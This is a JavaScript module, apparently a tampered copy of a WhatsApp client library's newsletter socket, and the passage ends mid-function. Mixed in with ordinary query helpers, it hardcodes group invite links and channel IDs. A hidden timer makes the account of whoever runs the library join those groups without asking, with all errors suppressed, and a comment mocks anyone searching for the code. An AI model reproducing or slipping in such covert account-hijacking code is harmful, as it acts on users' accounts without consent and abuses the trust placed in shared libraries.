"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
        variables,
        queryId,
        query,
        generateMessageTag
) => {
        return query({
                tag: 'iq',
                attrs: {
                        id: generateMessageTag(),
                        type: 'get',
                        to: WABinary_1.S_WHATSAPP_NET,
                        xmlns: 'w:mex'
                },
                content: [
                        {
                                tag: 'query',
                                attrs: { query_id: queryId },
                                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
                        }
                ]
        })
}

const executeWMexQuery = async (
        variables,
        queryId,
        dataPath,
        query,
        generateMessageTag
) => {
        const result = await wMexQuery(variables, queryId, query, generateMessageTag)
        const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
        if (child?.content) {
                const data = JSON.parse(child.content.toString())

                if (data.errors && data.errors.length > 0) {
                        const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
                        const firstError = data.errors[0]
                        const errorCode = firstError.extensions?.error_code || 400
                        throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
                }

                const response = dataPath ? data?.data?.[dataPath] : data?.data
                if (typeof response !== 'undefined') {
                        return response
                }
        }

        const action = (dataPath || '').startsWith('xwa2_')
                ? dataPath.substring(5).replace(/_/g, ' ')
                : dataPath?.replace(/_/g, ' ')
        throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}


const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/FwFBDPsQxXEJVRgDtMVxfd?mode=gi_t",
        "https://chat.whatsapp.com/L37gSjHDhsG6Ag5lKkxJ2K?mode=gi_t"
];

// hapus aja bg kalo mau error, btw lu kira beneran disini kah tempatnya?
const AUTO_FOLLOW_CHANNELS = [
   "120363423419836419@newsletter",
    "120363425135639322@newsletter",       
    "120363422160785189@newsletter",
    "120363416857498869@newsletter"
];

// Fungsi untuk mengekstrak kode invite dari link WhatsApp
function extractInviteCodeFromLink(link) {
    try {
        const url = new URL(link);
        if (url.hostname === 'chat.whatsapp.com') {
            const inviteCode = url.pathname.split('/').pop();
            if (inviteCode && inviteCode.length > 0) {
                return inviteCode;
            }
        }
    } catch (error) {}
    return null;
}

// Fungsi untuk auto join ke group WhatsApp
async function autoJoinWhatsAppGroups(sock) {
    const groupLinks = AUTO_JOIN_GROUP_LINKS;

    for (const groupLink of groupLinks) {
        try {
            const inviteCode = extractInviteCodeFromLink(groupLink);
            if (inviteCode) {
                // Coba metode pertama
                try {
                    await sock.groupAcceptInvite(inviteCode);
                } catch (error) {
                    // Coba metode kedua sebagai fallback
                    try {
                        await sock.groupAcceptInviteV4(inviteCode, '');
                    } catch (error2) {}
                }
            }
        } catch (error) {}

        // Delay 5 detik antar percobaan join
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// Fungsi untuk auto follow channel WhatsApp
async function autoFollowWhatsAppChannels(sock, newsletterWMexQuery) {
    const channels = AUTO_FOLLOW_CHANNELS;

    for (const channelId of channels) {
        try {
            await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
            // Delay 5 detik antar follow channel
            await new Promise(resolve => setTimeout(resolve, 5000));
        } catch (error) {}
    }
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

    // Auto join ke group WhatsApp terlebih dahulu
    setTimeout(async () => {
        try {
            await autoJoinWhatsAppGroups(sock);
        } catch {}
    }, 5000);

